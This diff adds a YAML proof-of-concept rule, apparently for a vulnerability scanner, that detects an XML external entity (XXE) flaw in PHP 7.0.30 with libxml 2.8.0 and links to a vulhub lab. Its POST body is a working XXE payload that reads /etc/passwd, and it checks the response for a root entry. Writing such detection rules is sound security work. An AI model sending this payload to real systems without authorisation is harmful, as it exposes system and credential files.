@@ -1,0 +1,20 @@
+name: poc-yaml-php-xxe
+rules:
+  - method: GET
+    path: /
+    expression: |
+      response.status == 200
+  - method: POST
+    path: /SimpleXMLElement.php
+    headers:
+      Content-Type: text/xml
+    body: >-
+      <?xml version="1.0" encoding="utf-8"?><!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root><name>&xxe;</name></root>
+    expression: |
+       response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+detail:
+  author: elliot
+  Affected Version: "PHP 7.0.30, libxml 2.8.0"
+  vuln_path: dom.php、SimpleXMLElement.php、simplexml_load_string.php
+  links: |
+    - https://github.com/vulhub/vulhub/tree/master/php/php_xxe
